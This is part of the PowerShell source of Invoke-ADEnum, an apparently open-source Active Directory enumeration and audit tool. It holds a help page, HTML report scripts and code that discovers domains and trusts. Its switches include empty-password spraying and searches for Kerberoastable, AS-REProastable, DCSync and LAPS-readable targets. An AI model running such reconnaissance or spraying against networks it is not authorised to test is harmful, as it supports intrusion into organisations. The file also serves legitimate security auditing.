function Invoke-ADEnum {

	<#

	.SYNOPSIS
	Invoke-ADEnum | Author: Rob LP (@L3o4j)
 	https://github.com/Leo4j/Invoke-ADEnum
	
	.DESCRIPTION
	Automated Active Directory Enumeration

 	.LICENSE
	GNU GENERAL PUBLIC LICENSE Version 3
	
	#>
	
    [CmdletBinding()] Param(

        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [String]
        $Domain,

        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [String]
        $Server,

        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [String]
        $Output,

        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [String]
        $Exclude,

        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $NoServers,

        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $Workstations,

        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $NoUnsupportedOS,

        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $DomainUsers,

        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $FindLocalAdminAccess,

        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $GPOsRights,

        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $MoreGPOs,

        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $AllGPOs,

        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $NoLAPS,

        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $LAPSComputers,

        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $NoAppLocker,

        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $NoVulnCertTemplates,

        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $NoADCSHTTPEndpoints,

        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $DomainOUs,

        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $Force,

        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $UserCreatedObjects,

        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $AllGroups,

        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $TargetsOnly,

        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $Debugging,

        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $NoClear,

        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $AllEnum,

        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $Help,

        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $NoDelegation,

        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $AllDescriptions,

        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $RBCD,

        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $WeakPermissions,

        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $LAPSExtended,

        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $LAPSReadRights,

        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $SprayEmptyPasswords,

        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $SaveToDisk,

        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $LoadFromDisk,

        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $NoSMBSharesEnum,

        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $NoSMBSigningEnum,

        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $NoVNCUnauthAccess,

        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $NoWebDAVEnum,

        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
        $EmptyGroups,

        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
    	$PassNotRequired,

        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
    	$NoOutput,

        [Parameter (Mandatory=$False, ValueFromPipeline=$true)]
        [Switch]
    	$IncludeUnreachable
	)
	
	$stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
	
	$invokedCommand = $MyInvocation.Line
	$invokedCommand = ($invokedCommand -split ';')[-1].Trim()
	$invokedCommand = $invokedCommand -replace "Invoke-ADEnum ", ""
	if($invokedCommand -eq "Invoke-ADEnum"){$invokedCommand = "None"}
	
	if(!$Debugging){
		$ErrorActionPreference = "SilentlyContinue"
		$WarningPreference = "SilentlyContinue"
	}
	
	# Set the process priority to High
	$currentProcess = [System.Diagnostics.Process]::GetCurrentProcess()
	$currentProcess.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::High
	
	Set-Variable MaximumHistoryCount 32767
	
	if($TargetsOnly -OR $Help -OR $NoOutput){}
	else{
 		$originalBufferSize = $host.UI.RawUI.BufferSize
 		$host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size(4096, $Host.UI.RawUI.BufferSize.Height)
	}
    
	if($NoClear){}
	else{clear}
    
    Write-Host "  _____                 _                      _____  ______                       " -ForegroundColor Red
    Write-Host " |_   _|               | |               /\   |  __ \|  ____|                      " -ForegroundColor Red
    Write-Host "   | |  _ ____   _____ | | _____ ______ /  \  | |  | | |__   _ __  _   _ _ __ ___  " -ForegroundColor Red
    Write-Host "   | | | '_ \ \ / / _ \| |/ / _ \______/ /\ \ | |  | |  __| | '_ \| | | | '_ ' _  \" -ForegroundColor Red
    Write-Host "  _| |_| | | \ V / (_) |   <  __/     / ____ \| |__| | |____| | | | |_| | | | | | |" -ForegroundColor Red
    Write-Host " |_____|_| |_|\_/ \___/|_|\_\___|    /_/    \_\_____/|______|_| |_|\__,_|_| |_| |_|" -ForegroundColor Red
	Write-Host ""
	Write-Host "                                       [+] Rob LP (@L3o4j) https://github.com/Leo4j" -ForegroundColor Yellow
	
	if($Help){
		
		Write-Host "
 [PARAMETERS]" -ForegroundColor Yellow
		Write-Host "
 -Domain <domain FQDN>		The Domain to enumerate for. Leave blank for All
 
 -Exclude <domain FQDN>		Exclude one or more domains from enumeration
 
 -Output <path-on-disk>		Specify the tool output location (default: pwd)

 -Server <DC FQDN or IP>	The DC to bind to (requires you to specify a Domain)

"
		Write-Host " [SWITCHES]" -ForegroundColor Yellow
		Write-Host "
 -AllDescriptions		Enumerate description for every domain object
  
 -AllEnum			Enumerate for (almost) Everything (may take a long time depending on domain size)
 
 -AllGroups			Enumerate for All Domain Groups
 
 -AllGPOs			List all domain GPOs
 
 -Debugging			Will print errors on screen
 
 -DomainOUs			Enumerate for Organizational Units
 
 -DomainUsers			Enumerate for Users

 -EmptyGroups			Enumerate for Empty Groups
 
 -FindLocalAdminAccess		Enumerate for Machines where the Current User is Local Admin
 
 -Force				Full Coverage when used in combination with -AllEnum flag (may take a long time depending on domain size)

 -GPOsRights			Enumerate GPOs Rights | Who can Create/Modify/Link GPOs
 
 -Help				Show this Help page
 
 -IncludeUnreachable		Will not exclude unreachable domains from the scope
 
 -LAPSComputers			Enumerate for Computer objects where LAPS is enabled

 -LAPSExtended			Enumerate for LAPS Extended Rights

 -LAPSReadRights		Enumerate for Users who can Read LAPS

 -LoadFromDisk			Load collection data from disk and skip collection (Location: c:\Users\Public\Documents\Invoke-ADEnum)
 
 -MoreGPOs			More enumeration leveraging GPOs
 
 -MoreOUs			More enumeration leveraging Organizational Units

 -NoADCSHTTPEndpoints		Do not enumerate for ADCS HTTP Endpoints
 
 -NoAppLocker			Do not enumerate for AppLocker GPO
 
 -NoClear			Do not clear terminal before running

 -NoDelegation			Do not enumerate for Constrained, RBCD and user created objects
 
 -NoLAPS			Do not enumerate for LAPS GPO
 
 -NoServers			Do not enumerate for Servers

 -NoSMBSharesEnum		Do not enumerate for R+W SMB Shares

 -NoSMBSigningEnum		Do not enumerate for SMB Signing
 
 -NoUnsupportedOS		Do not enumerate for machines running unsupported OS
 
 -NoVNCUnauthAccess		Do not enumerate for machines where VNC Unauthenticated Access is supported
 
 -NoVulnCertTemplates		Do not enumerate for Misconfigured Certificate Templates

 -NoWebDAVEnum			Do not enumerate for machines where WebDAV Service is running

 -PassNotRequired		Enumerate for Users and Computers having Password-not-required attribute set

 -RBCD				Check for Resource Based Constrained Delegation (may take a long time depending on domain size)

 -SaveToDisk			Save collection data to disk (Location: c:\Users\Public\Documents\Invoke-ADEnum)

 -SprayEmptyPasswords		Sprays Empty Passwords - counts towards Bad-Pwd-Count
 
 -TargetsOnly			Show Target Domains only (Stay in scope) - Will not create a Report

 -UserCreatedObjects		Show Computer Objects created by regular users (may take a long time depending on domain size)

 -WeakPermissions		Checks for users and groups weak permissions (may take a long time depending on domain size)
 
 -Workstations			Enumerate for Workstations

"
		Write-Host " [EXAMPLES]" -ForegroundColor Yellow
		Write-Host "
 Invoke-ADEnum

 Invoke-ADEnum -TargetsOnly

 Invoke-ADEnum -Domain contoso.local -Server DC01.contoso.local

 Invoke-ADEnum -Output C:\Windows\Temp

 Invoke-ADEnum -Exclude `"contoso.local,domain.local`" -NoVulnCertTemplates

 Invoke-ADEnum -AllEnum -Force

"
		Write-Host " [Recommended Coverage]" -ForegroundColor Yellow
		Write-Host " 
 Invoke-ADEnum -SprayEmptyPasswords -FindLocalAdminAccess -RBCD -WeakPermissions -UserCreatedObjects -AllDescriptions

"
		
		break
		
	}
	
	$jQueryBase64 = ""
	$XlsxBase64 = ""
	$jQueryScript = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($jQueryBase64))
	$XlsxScript = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($XlsxBase64))
	
	$Comboheader = @"
    <script>$jQueryScript</script>
    <script>$XlsxScript</script>
"@

$xlsHeader = @'
		<script>
		function tableToCSV($table, title) {
			var csv = [];
			
			// Add title if provided
			if (title) {
				csv.push(title);
			}
			
			$table.find('tr').each(function() {
				var temp = [];
				$(this).find('td, th').each(function() {
					temp.push($(this).text());
				});
				csv.push(temp.join(','));
			});
			return csv.join('\n');
		}
		</script>
		
		<script>
		function createDownloadLinkForTable(tableID) {
			console.log("Function called for tableID:", tableID);
			
			// Get the title from the associated h2 element
			var title = $("h2[data-linked-table='" + tableID + "']").text();
			
			var csv = tableToCSV($('#' + tableID), title);
			console.log("CSV Generated:", csv);

			var csvDataURI = 'data:text/csv;charset=utf-8,' + encodeURIComponent(csv);
			console.log("Data URI:", csvDataURI);

			var titleElement = $("h2[data-linked-table='" + tableID + "']");
			var originalTitleText = titleElement.text();
			titleElement.html('<a href="' + csvDataURI + '" class="download-link" download="' + tableID + '.csv">' + originalTitleText + '</a>');
			console.log("Link created for tableID:", tableID);
		}
		
		function tablesToExcel() {
			var wb = XLSX.utils.book_new(); // New workbook
			
			//Mappings
			var nameMapping = {
				'Foreign Domain Members': 'Foreign Members',
				'Enterprise Read-Only Domain Controllers': 'Enterprise RODC',
				'Constrained Delegation (Computers)': 'Constrained Delegation (Comp)',
				'Resource Based Constrained Delegation': 'Resource Based C.D.',
				'Computer Objects created by regular users': 'User Created Computers',
				'Allowed To Act On Behalf Of Other Identity': 'Allowed To Act',
				'Check if any User Passwords are set': 'User Passwords Set',
				'Check if any Unix User Passwords are set': 'Unix Passwords Set',
				'Users with Password-not-required attribute set': 'Users Pass Not-Req',
				'Computers with Password-not-required attribute set': 'Comp Pass Not-Req',
				'Members of Pre-Windows 2000 Compatible Access group': 'Pre-Win2k',
				'Domain Controllers': 'DCs',
				'Domains for the current forest': 'Current Forest Domains',
				'Domain Trusts': 'Trusts',
				'Trusted Domain Object GUIDs': 'Trusted GUIDs',
				'Built-In Administrators': 'Built-In Admins',
				'Enterprise Administrators': 'EAs',
				'Domain Administrators': 'DAs',
				'Group Policy Creator Owners': 'GPO Creator Owners',
				'Read-Only Domain Controllers': 'Read-Only DCs',
				'User Accounts with empty passwords': 'Empty Pass Users',
				'Computer Accounts with empty passwords': 'Empty Pass Comp',
				'Hosts running Unsupported OS': 'Unsupported OS',
				'LM Compatibility Level': 'LM Comp.Lvl',
				'Machine Account Quota': 'Machine Quota',
				'Principals with DCSync permissions': 'DCSync Rights',
				'Members of Exchange Trusted Subsystem group': 'Exch. T.S. Members',
				'Service Accounts (Kerberoastable)': 'Service Accounts',
				'Group Managed Service Accounts (GMSA)': 'GMSA',
				'Users without kerberos preauthentication set (AS-REProastable)': 'AS-REProastable',
				'Groups with AdminCount set to 1 (non-defaults)': 'AdminCount Groups',
				'Protected and \'Sensitive and Not Allowed for Delegation\' status (Administrators)': 'Prot and Sens Status (Admins)',
				'Protected and \'Sensitive and Not Allowed for Delegation\' status (Security Groups)': 'Prot and Sens Status (SecGrps)',
				'Protected and \'Sensitive and Not Allowed for Delegation\' status (Admin Count)': 'Prot and Sens Status (AdmCount)',
				'Machine accounts in privileged groups': 'Machines in Priv.Groups',
				'Users with sidHistory set': 'sidHistory',
				'WebDAV Enabled Machines': 'WebDAV Enabled',
				'Users with Reversible Encryption': 'Reversible Enc.',
				'Linked DA accounts using name correlation': 'Linked DA',
				'Who can create GPOs': 'GPO Creators',
				'Who can modify existing GPOs': 'GPO Modifiers',
				'Who can link GPOs': 'GPO Linkers',
				'Other GPOs where a LAPS Admin seems to be set': 'Other LAPS GPOs',
				'Who can read LAPS': 'LAPS Readers',
				'LAPS Extended Rights': 'LAPS Ext.Rights',
				'Computer objects where LAPS is enabled': 'LAPS Enabled',
				'GPOs that modify local group memberships': 'GPOs Mod. Local Groups',
				'Find Domain User Location': 'Find User Location',
				'Windows 7 and Server 2008 Machines (Windows Remoting Enabled)': 'Win7 and Serv2008',
				'Interesting Servers (by Keyword)': 'Interesting Servers',
				'Interesting GPOs (by Keyword)': 'Interesting GPOs',
				'Interesting Groups (by Keyword)': 'Interesting Groups',
				'Interesting OUs (by Keyword)': 'Interesting OUs',
				'Accessible Domain Shares': 'Accessible Shares',
    			'Readable and Writable Shares': 'R+W Shares',
				'Domain Share Files': 'Share Files',
				'Domain Share Files (more file extensions)': 'Share Files+',
				'Interesting ACLs': 'Interesting ACLs',
				'Default Domain Policy': 'Pass Policy',
				'Kerberos Password Policy': 'Kerb Policy',
				'User Accounts Analysis': 'User Analysis',
				'Computer Account Analysis': 'Comp. Analysis',
				'Operating Systems Insights': 'OS Insights',
				'All Groups': 'All Groups',
				'All Domain GPOs': 'All GPOs',
				'All Domain OUs': 'All OUs',
				'All Descriptions': 'Descriptions',
				'EnvironmentInfo': 'Info',
			};
			
			var ws = null;
			var lastSheetName = null;

			// Loop through each table
			$('table').each(function() {
				var id = $(this).attr('id');
				var h2Text = $("h2[data-linked-table='" + id + "']").text();
				
				if (h2Text) {
					// If there's a current working sheet (from the last iteration), append it to the workbook
					if (ws) {
						XLSX.utils.book_append_sheet(wb, ws, lastSheetName);
					}

					// Reset the working worksheet and process the new table
					ws = XLSX.utils.table_to_sheet(this);

					// Determine the sheet name
					var sheetName = h2Text;
					if (nameMapping[h2Text]) {
						sheetName = nameMapping[h2Text];
					}
					
					// Automatically truncate if the name is too long
					if(sheetName.length > 31) {
						console.warn("Sheet name too long:", sheetName, "; truncating to 31 characters");
						sheetName = sheetName.substr(0, 31); // Truncate the name to the first 31 characters
					}
					
					// Shift all rows down by one
					var range = XLSX.utils.decode_range(ws["!ref"]);
					for (var R = range.e.r; R >= 0; --R) {
						for (var C = 0; C <= range.e.c; ++C) {
							var cell_address = {c: C, r: R + 1}; // New location
							var original_address = {c: C, r: R}; // Original location
							if (ws[XLSX.utils.encode_cell(original_address)]) {
								ws[XLSX.utils.encode_cell(cell_address)] = ws[XLSX.utils.encode_cell(original_address)];
								delete ws[XLSX.utils.encode_cell(original_address)]; // Delete the original cell to avoid duplication
							}
						}
					}
					range.e.r++;
					ws["!ref"] = XLSX.utils.encode_range(range);

					// Set the title from the h2 content to the first row, first column
					ws['A1'] = {v: h2Text, t: 's'};
					
					// Autosize columns based on content
					var colWidths = [];
					$(this).find('tr').each(function() {
						$(this).find('td, th').each(function(colIdx, cell) {
							var cellContentLength = $(cell).text().length;
							colWidths[colIdx] = Math.max(colWidths[colIdx] || 0, cellContentLength); // find max length for each column
						});
					});

					// Convert column widths to the format required by XLSX.js and assign to ws
					ws['!cols'] = colWidths.map(function(width) {
						return { wch: width };
					});
					
					// Store the current sheet name
					lastSheetName = sheetName;
				}
				
				else if (ws) { // If there's no title and we have a current worksheet
					// Append the current table's rows to the existing worksheet
					var currWs = XLSX.utils.table_to_sheet(this);
					var wsRange = XLSX.utils.decode_range(ws["!ref"]);
					var currRange = XLSX.utils.decode_range(currWs["!ref"]);

					for (var R = 0; R <= currRange.e.r; R++) {
						for (var C = 0; C <= currRange.e.c; C++) {
							var cell = currWs[XLSX.utils.encode_cell({c: C, r: R})];
							if (cell) {
								ws[XLSX.utils.encode_cell({c: C, r: wsRange.e.r + R + 1})] = cell;
							}
						}
					}

					wsRange.e.r += currRange.e.r + 1;
					ws["!ref"] = XLSX.utils.encode_range(wsRange);
				}
			});
			
			// After processing all tables, check if there's any residual data in ws
			if (ws) {
				XLSX.utils.book_append_sheet(wb, ws, lastSheetName);
			}

			return wb;
		}

		$(document).ready(function() {
			$('#downloadAll').on('click', function() {
				var wb = tablesToExcel();
				XLSX.writeFile(wb, "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.xlsx");
			});
			createDownloadLinkForTable('BuiltinAdministrators');
			createDownloadLinkForTable('TargetDomains');
			createDownloadLinkForTable('AllForests');
			createDownloadLinkForTable('CurrentForestDomains');
			createDownloadLinkForTable('KrbtgtAccounts');
			createDownloadLinkForTable('DomainControllers');
			createDownloadLinkForTable('ForestDomain');
			createDownloadLinkForTable('ForestGlobalCatalog');
			createDownloadLinkForTable('GetDomainTrust');
			createDownloadLinkForTable('TrustAccounts');
			createDownloadLinkForTable('DomainTrusts');
			createDownloadLinkForTable('TrustedDomainObjectGUIDs');
			createDownloadLinkForTable('ForeignDomainMembers');
			createDownloadLinkForTable('EnterpriseAdmins');
			createDownloadLinkForTable('DomainAdmins');
			createDownloadLinkForTable('AccountOperators');
			createDownloadLinkForTable('BackupOperators');
			createDownloadLinkForTable('CertPublishers');
			createDownloadLinkForTable('DNSAdmins');
			createDownloadLinkForTable('DCOMUsers');
			createDownloadLinkForTable('EnterpriseKeyAdmins');
			createDownloadLinkForTable('EnterpriseRODCs');
			createDownloadLinkForTable('GPCreatorOwners');
			createDownloadLinkForTable('KeyAdmins');
			createDownloadLinkForTable('PrintOperators');
			createDownloadLinkForTable('OrganizationManagement');
			createDownloadLinkForTable('PerformanceLogUsers');
			createDownloadLinkForTable('ProtectedUsers');
			createDownloadLinkForTable('FileServers');
			createDownloadLinkForTable('SQLInstances');
			createDownloadLinkForTable('SCCMServers');
			createDownloadLinkForTable('WSUSServers');
			createDownloadLinkForTable('WebDavEnabled');
			createDownloadLinkForTable('VNCUnauthAccess');
			createDownloadLinkForTable('SMBSigningNotRequired');
			createDownloadLinkForTable('DuplicateSPNs');
			createDownloadLinkForTable('Printers');
   			createDownloadLinkForTable('RWShares');
   			createDownloadLinkForTable('HomeDirectories');
			createDownloadLinkForTable('RODCs');
			createDownloadLinkForTable('RDPUsers');
			createDownloadLinkForTable('RemManUsers');
			createDownloadLinkForTable('SchemaAdmins');
			createDownloadLinkForTable('ServerOperators');
			createDownloadLinkForTable('ADCSEndpoints');
			createDownloadLinkForTable('CertTemplates');
			createDownloadLinkForTable('Unconstrained');
			createDownloadLinkForTable('ConstrainedDelegationComputers');
			createDownloadLinkForTable('ConstrainedDelegationUsers');
			createDownloadLinkForTable('RBCDObjects');
			createDownloadLinkForTable('WeakPermissions');
			createDownloadLinkForTable('AllowedToAct');
			createDownloadLinkForTable('UserCreatedObjects');
			createDownloadLinkForTable('PasswordSetUsers');
   			createDownloadLinkForTable('UnixPasswordSet');
			createDownloadLinkForTable('PassNotRequired');
			createDownloadLinkForTable('CompPassNotRequired');
			createDownloadLinkForTable('EmptyPasswordUsers');
			createDownloadLinkForTable('EmptyPasswordComp');
			createDownloadLinkForTable('PreWin2kCompatibleAccess');
			createDownloadLinkForTable('UnsupportedHosts');
			createDownloadLinkForTable('LLMNRStatus');
			createDownloadLinkForTable('LMCompatibilityLevel');
			createDownloadLinkForTable('MachineQuota');
			createDownloadLinkForTable('MachineQuota');
			createDownloadLinkForTable('ReplicationUsers');
			createDownloadLinkForTable('ExchangeTrustedSubsystem');
			createDownloadLinkForTable('ServiceAccounts');
			createDownloadLinkForTable('GMSAs');
			createDownloadLinkForTable('nopreauthset');
			createDownloadLinkForTable('GPPasswords');
			createDownloadLinkForTable('GroupsAdminCount');
			createDownloadLinkForTable('AdminsProtectedUsersAndSensitive');
			createDownloadLinkForTable('SecProtectedUsersAndSensitive');
			createDownloadLinkForTable('AdmCountProtectedUsersAndSensitive');
			createDownloadLinkForTable('MachineAccountsPriv');
			createDownloadLinkForTable('sidHistoryUsers');
			createDownloadLinkForTable('RevEncUsers');
			createDownloadLinkForTable('EmptyGroups');
			createDownloadLinkForTable('FindLocalAdminAccess');
			createDownloadLinkForTable('GPOCreators');
			createDownloadLinkForTable('GPOsWhocanmodify');
			createDownloadLinkForTable('GpoLinkResults');
			createDownloadLinkForTable('LAPSGPOs');
			createDownloadLinkForTable('LAPSCanRead');
			createDownloadLinkForTable('LAPSExtended');
			createDownloadLinkForTable('LapsEnabledComputers');
			createDownloadLinkForTable('AppLockerGPOs');
			createDownloadLinkForTable('GPOLocalGroupsMembership');
			createDownloadLinkForTable('LocalAdminAccess');
			createDownloadLinkForTable('Win7AndServer2008');
			createDownloadLinkForTable('InterestingServersEnabled');
			createDownloadLinkForTable('KeywordDomainGPOs');
			createDownloadLinkForTable('GroupsByKeyword');
			createDownloadLinkForTable('DomainOUsByKeyword');
			createDownloadLinkForTable('Subnets');
			createDownloadLinkForTable('VulnLMCompLevelComp');
			createDownloadLinkForTable('DomainPolicy');
			createDownloadLinkForTable('OtherPolicies');
			createDownloadLinkForTable('KerberosPolicy');
			createDownloadLinkForTable('UserAccountAnalysis');
			createDownloadLinkForTable('ComputerAccountAnalysis');
			createDownloadLinkForTable('OperatingSystemsAnalysis');
			createDownloadLinkForTable('ServersEnabled');
			createDownloadLinkForTable('ServersDisabled');
			createDownloadLinkForTable('WorkstationsEnabled');
			createDownloadLinkForTable('WorkstationsDisabled');
			createDownloadLinkForTable('EnabledUsers');
			createDownloadLinkForTable('DisabledUsers');
			createDownloadLinkForTable('OtherGroups');
			createDownloadLinkForTable('DomainGPOs');
			createDownloadLinkForTable('AllDomainOUs');
			createDownloadLinkForTable('AllDescriptions');
		});

		</script>
	
		<style>

			h1 {

				font-family: Arial, Helvetica, sans-serif;
				color: #ff781f;
				font-size: 35px;
				cursor: pointer;

			}
			
			h1:hover {
				color: #ff9a4e;
				text-decoration: underline;
			}
			
			h2 {

				font-family: Arial, Helvetica, sans-serif;
				color: #2f9fb3;
				font-size: 20px;

			}
			
			h3 {

				font-family: Arial, Helvetica, sans-serif;
				color: #ff781f;
				font-size: 20px;

			}

			
			
		   table {
				font-size: 15px;
				border: 0px; 
				font-family: Arial, Helvetica, sans-serif;
			} 
			
			td {
				padding: 8px;
				margin: 0px;
				border: 0;
			}
			
			th {
				background: #395870;
				background: linear-gradient(#49708f, #293f50);
				color: #fff;
				font-size: 15px;
				padding: 10px 15px;
				vertical-align: middle;
			}

			tbody tr:nth-child(even) {
				background: #f0f0f2;
			}

				#CreationDate {

				font-family: Arial, Helvetica, sans-serif;
				color: #ff3300;
				font-size: 12px;

			}

   			.YesStatus {
				color: #ff0000;
			}

			.NoStatus {
				color: #008000;
			}
			
			.download-link {
				color: inherit; /* Use the color of the surrounding text */
				text-decoration: none; /* Remove underline */
				font-size: 20px;
			}

			.download-link:hover {
				color: #51b2c6;
				text-decoration: underline; /* Add underline on hover for better UX */
			}
			
		</style>
'@

	# Set the path and filename for the output file
	$DateFormat = Get-Date -Format "dd.MM.yy-HH.mm"

	if($Domain){$xlsHeader = $xlsHeader -Replace "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx","$($DateFormat)_AD-Audit_$Domain"}
	else{$OutDomain=($env:userdnsdomain).ToLower();$xlsHeader = $xlsHeader -Replace "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx","$($DateFormat)_AD-Audit_$OutDomain"}

	if($Output){
		$Output = $Output.TrimEnd('\')
		if($Domain){
			$OutputFilePath = "$Output\$($DateFormat)_AD-Audit_$Domain.txt"
		}
		else{
			$OutDomain=($env:userdnsdomain).ToLower()
			$OutputFilePath = "$Output\$($DateFormat)_AD-Audit_$OutDomain.txt"
		}
	}
	else{
		if($Domain){
			$OutputFilePath = "$pwd\$($DateFormat)_AD-Audit_$Domain.txt"
		}
		else{
			$OutDomain=($env:userdnsdomain).ToLower()
			$OutputFilePath = "$pwd\$($DateFormat)_AD-Audit_$OutDomain.txt"
		}
	}
	
	# Start capturing the script's output and save it to the file
	
	if(!($TargetsOnly -OR $Help)){Start-Transcript -Path $OutputFilePath | Out-Null}

$toggleScript = @"
<script>
  function toggleSections(event) {
    var sections = document.querySelectorAll('.report-section');
    sections.forEach(function(section) {
      section.style.display = section.style.display === 'none' ? 'block' : 'none';
    });

    // Update the text based on the current state
    var target = event.target || event.srcElement;  // srcElement for IE compatibility
    if (target.textContent === 'Click here to Show') {
      target.textContent = 'Click here to Hide';
    } else {
      target.textContent = 'Click here to Show';
    }
  }
</script>
"@

$header = $Comboheader + $xlsHeader + $toggleScript
	
    if($Domain){
		if(!$Server){
			$currentDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)))
			$domainControllers = $currentDomain.DomainControllers
			$Server = ($domainControllers | Where-Object {$_.Roles -like "*RidRole*"}).name
			if(!$Server){
				$result = nslookup -type=all "_ldap._tcp.dc._msdcs.$Domain" 2>$null
				$Server = ($result | Where-Object { $_ -like '*svr hostname*' } | Select-Object -First 1).Split('=')[-1].Trim()
			}
		}
	}

	elseif($Server -and !$Domain){
		$Domain = ($Server.Split('.') | Select-Object -Skip 1) -join '.'
		if(!$Domain){
			$Domain = Read-Host "Enter the domain name"
			#$ServerParam = [Parameter(Mandatory=$True, Position=2, ValueFromPipeline=$true)][String]$Server
		}
	}
	
	# All Domains
	$FindCurrentDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
	if(!$FindCurrentDomain){$FindCurrentDomain = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties().DomainName.Trim()}
	if(!$FindCurrentDomain){$FindCurrentDomain = $env:USERDNSDOMAIN}
	if(!$FindCurrentDomain){$FindCurrentDomain = Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select Domain | Format-Table -HideTableHeaders | out-string | ForEach-Object { $_.Trim() }}
	
	$ParentDomain = ($FindCurrentDomain | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name)
	$DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $ParentDomain)
	$ChildContext = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
	$ChildDomains = @($ChildContext | Select-Object -ExpandProperty Children | Select-Object -ExpandProperty Name)
	
	$AllDomains = @($ParentDomain)
	$AllDomains += @($FindCurrentDomain | Select-Object -ExpandProperty Name)
	
	if($ChildDomains){
		foreach($ChildDomain in $ChildDomains){
			$AllDomains += $ChildDomain
		}
	}
	
	# Trust Domains
	$DiscoveredDomains = @()   # All discovered domains
	$DomainsToCheck = @()      # Queue of domains to check
	$CheckedDomains = @()      # Domains that have already been checked

	if ($Domain -and $Server) {
		$DomainsToCheck = @($Domain)
	} elseif ($AllDomains) {
		$DomainsToCheck = @($AllDomains)
	} else {
		Write-Error "No domain or server information provided."
		return
	}

	do {
		$NewDomains = @()

		foreach ($CurrentDomain in $DomainsToCheck) {
			# Skip if the domain has already been checked
			if ($CurrentDomain -in $CheckedDomains) {
				continue
			}

			# Find trusts for the current domain
			if ($CurrentDomain -and $Server) {
				$Trusts = FindDomainTrusts -Domain $CurrentDomain -Server $Server
			} else {
				$Trusts = FindDomainTrusts -Domain $CurrentDomain
			}

			# Extract unique trust target names
			$TrustTargetNames = @($Trusts.TargetName | Sort-Object -Unique)

			# Exclude already discovered domains
			$TrustTargetNames = @($TrustTargetNames | Where-Object { $_ -notin $DiscoveredDomains })

			# Add these new domains to the current iteration
			$NewDomains += @($TrustTargetNames)

			# Mark the current domain as checked
			$CheckedDomains += @($CurrentDomain)
		}

		# Add newly discovered domains to the global list
		$DiscoveredDomains += @($NewDomains)
		$DiscoveredDomains = @($DiscoveredDomains | Sort-Object -Unique)

		# Update domains to check for the next iteration
		$DomainsToCheck = @($NewDomains)

	} while ($DomainsToCheck.Count -gt 0) # Continue until no new domains are found

	# Output all discovered domains
	$TrustTargetNames = $DiscoveredDomains
	
	# Remove Outbound Trust from $AllDomains
	
	if($Domain -AND $Server) {
		$OutboundTrusts = @(FindDomainTrusts -Domain $Domain -Server $Server | Where-Object { $_.TrustDirection -eq 'Outbound' } | Select-Object -ExpandProperty TargetName)
	}
	
	else{
		$OutboundTrusts = @(foreach($AllDomain in $AllDomains){FindDomainTrusts -Domain $AllDomain | Where-Object { $_.TrustDirection -eq 'Outbound' } | Select-Object -ExpandProperty TargetName})
	}
	
